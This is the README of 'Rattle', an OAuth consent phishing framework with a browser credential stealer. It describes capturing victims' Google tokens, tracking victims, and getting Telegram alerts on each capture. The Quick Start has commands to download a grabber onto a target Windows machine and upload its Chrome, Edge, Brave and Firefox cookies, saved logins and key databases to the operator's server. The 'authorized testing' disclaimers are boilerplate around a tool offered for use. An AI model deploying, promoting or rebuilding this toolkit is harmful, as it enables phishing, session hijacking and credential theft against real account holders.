<div align="center">
  <h1>🐍 Rattle</h1>
  <p><strong>Google OAuth Consent Phishing Toolkit + Browser Data Collector</strong></p>
  <p>
    <img src="https://img.shields.io/badge/version-1.2.0-blue" alt="Version">
    <img src="https://img.shields.io/badge/python-3.8+-green" alt="Python">
    <img src="https://img.shields.io/badge/license-MIT-red" alt="License">
    <img src="https://img.shields.io/badge/server-linux-lightgrey" alt="Server">
    <img src="https://img.shields.io/badge/grabber-windows-blueviolet" alt="Grabber">
  </p>
  <p><i>Professional-grade OAuth consent phishing framework with a modern web interface,
  per-target tracked links, token liveness monitoring, and a zero-dependency
  browser-data collector for authorized security testing.</i></p>
</div>

---

## 📋 Overview

**Rattle** is a complete toolkit for authorized Google OAuth consent phishing and
browser data collection:

- a **web dashboard** (Flask + Docker) that builds campaigns, hands every target
  a unique tracked link, captures OAuth tokens, refreshes them, and watches their
  liveness in the background
- a **client script** (`browser_grab.py`) that runs on Windows machines you are
  authorized to test and collects Chrome / Edge / Brave / Firefox browser data
  (Local State, Cookies, Login Data, cookies.sqlite, logins.json, key4.db),
  auto-zips it, and uploads it back to the dashboard

> ⚠️ **Disclaimer**: This tool is for educational and authorized security testing
> purposes only. You must own the machines, or have explicit permission.
> Unauthorized use is illegal. The author assumes no responsibility for misuse.

---

## ✨ Features

### OAuth / server side

| Feature | Description |
|---------|-------------|
| 🎯 **Campaign Management** | Create, manage, and track multiple campaigns |
| 🔗 **Per-Target Tracked Links** | Unique link per target; click counting + exact attribution via OAuth `state` |
| 👤 **Victim Tracking** | Monitor victims, IPs, user agents, statuses |
| 🔑 **Token Capture** | Capture OAuth access + refresh tokens |
| 💓 **Token Liveness** | Background worker re-checks every token every 30 min → valid / dead / unknown badges |
| 📊 **Dashboard Analytics** | Real-time statistics and activity charts |
| 📱 **Telegram Alerts** | Instant phone notification on every capture — and on every grab |
| 🔐 **Login + TOTP MFA** | Password + authenticator app + audit log |
| 🖥️ **Modern UI** | Bootstrap-based, responsive |
| 🔒 **SSL-Ready** | Built-in Nginx + Let's Encrypt setup script |

### Browser data collection (grabber client)

| Feature | Description |
|---------|-------------|
| 🌐 **Chromium Browsers** | Chrome, Edge, Brave — copies `Local State`, `Cookies` (Network\ path + legacy), `Login Data` per profile |
| 🦊 **Firefox** | `cookies.sqlite`, `logins.json`, `key4.db` per profile |
| 🔒 **Lock-Tolerant** | Direct copy first; if the browser locks the file, SQLite `immutable` backup reads it anyway |
| 📦 **Auto-Zip** | Everything zipped into one archive, with a `manifest.json` summary |
| 🚀 **Direct Upload** | Optional one-command upload to the dashboard (`/api/grab/upload`, key-protected) |
| 🎨 **Colored Output** | Clear, colored, fully error-handled console reporting |
| 🧩 **Zero Dependencies** | Pure Python standard library — no pip installs on the target |

---

## 🚀 Quick Start (server)

```bash
# Clone
git clone https://github.com/officialmonsterz/rattle.git
cd rattle

# Virtual environment + deps
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Configure
cp config.example.py config.py   # then edit config.py

# Run
python3 app.py
```

For the full production deployment (Docker, Nginx, SSL, Telegram, Google
Cloud) follow **deployment.md** — an A-to-Z, expected-output-at-every-step guide.

## 🧰 Quick Start (grabber client — Windows machines you own/are authorized to test)

```bash
# on the target machine (needs Python 3 only, NO pip installs)
curl -o rattle_grab.py https://your-server/grab/download

python rattle_grab.py --upload https://your-server/api/grab/upload --device my-laptop
```

The zip appears on the **Grabs** page of the dashboard, and you get a Telegram
alert. Options: `--browsers chrome,edge,brave,firefox`, `--out FOLDER`,
`--key KEY`. Inside the zip you will find, per browser/profile:
`Local State` + `Cookies.sqlite` + `Login Data.sqlite` (Chromium) or
`cookies.sqlite` + `logins.json` + `key4.db` (Firefox) — the artifacts needed to
decrypt sessions on the machine that owns them.

---

## 📁 Project Structure

```
rattle/
├── app.py                  # Main Flask application (incl. grabber endpoints)
├── models.py               # Database models (incl. Grab)
├── notifier.py             # Telegram alerts (tokens + grabs)
├── liveness.py             # Token liveness worker
├── browser_grab.py         # Grabber client (run on authorized Windows machines)
├── config.py               # Local configuration (git-ignored)
├── config.example.py       # Example configuration
├── requirements.txt        # Python dependencies
├── setup_nginx_ssl.sh      # Nginx + SSL automation
├── Dockerfile / docker-compose.yml
├── static/{css,js}         # Styles + frontend JS
└── templates/              # dashboard, campaigns, victims, tokens, grabs, mfa, settings
```

---

## 📊 New: Grabs Page

Every uploaded archive is listed with device label, browsers collected, cookie
count, size, source IP and download/delete buttons. Archives live on the Docker
volume (`instance/grabs/`) and survive reboots and rebuilds.

---

## 🛡️ Security Notes

1. **Use HTTPS** — production deployments should always sit behind SSL
2. **Set `GRAB_UPLOAD_KEY`** in `config.py` so your upload endpoint rejects strangers
3. **Change the admin password** after first login and **enable MFA**
4. **Limited scopes** — request only the OAuth scopes you need
5. **Test users only** — keep the Google app in Testing mode with your own accounts

---

## 📝 Requirements (server)

Python 3.8+, Flask 2.3+, Flask-SQLAlchemy 2.0+, Flask-Migrate, requests, pyotp,
qrcode, Gunicorn (production), Nginx + Certbot (SSL).
**Grabber client: Python 3 standard library only.**

---

## 🤝 Contributing

1. Fork → 2. branch → 3. commit → 4. push → 5. Pull Request

---

## 📄 License

Distributed under the MIT License. See `LICENSE`.

---

## 🏆 Credits & Official Channels

| | |
|---|---|
| **Official Channel & Tools** | [t.me/officialmonsterz](https://t.me/officialmonsterz) |
| **Official Username** | @officialmonstersadmin |
| **Official Backup Channel** | [t.me/officialmonsters](https://t.me/officialmonsters) |
| **GitHub Official** | [github.com/officialmonsterz](https://github.com/officialmonsterz) |
| **Signal Official** | [bit.ly/3RXMrFa](https://bit.ly/3RXMrFa) |
| **E-mail Official** | shapads@tutamail.com |

---

> **This tool is for educational purposes and authorized security testing only.**
> You must have explicit permission to test any target.
> Unauthorized access to computer systems and accounts is illegal.
> The author assumes no responsibility for misuse.

<div align="center">
  <sub>Built with ❤️ for security research — officialmonsterz</sub>
</div>
